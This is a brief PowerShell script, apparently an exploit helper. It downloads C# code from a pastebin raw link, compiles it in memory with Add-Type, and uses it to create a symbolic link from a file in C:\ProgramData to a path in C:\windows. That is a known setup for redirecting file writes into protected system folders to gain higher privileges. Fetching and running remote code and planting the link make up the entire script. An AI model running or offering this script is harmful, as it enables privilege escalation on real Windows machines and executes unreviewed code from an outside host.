$url = 'https://pastebin.com/raw/d1phQyXR'
$code = Invoke-WebRequest -Uri $url -UseBasicParsing;
Add-Type $code
$s = New-Object de.usd.SharpLink.Symlink("C:\ProgramData\test\1.txt", "C:\windows\target.txt")
$s.Open()
#$s.Status()
#Write-Host "[-] test!!!" -ForegroundColor Red
#Write-Host "[+] test $target2"
#Start-Sleep -s 3
$s.Close()
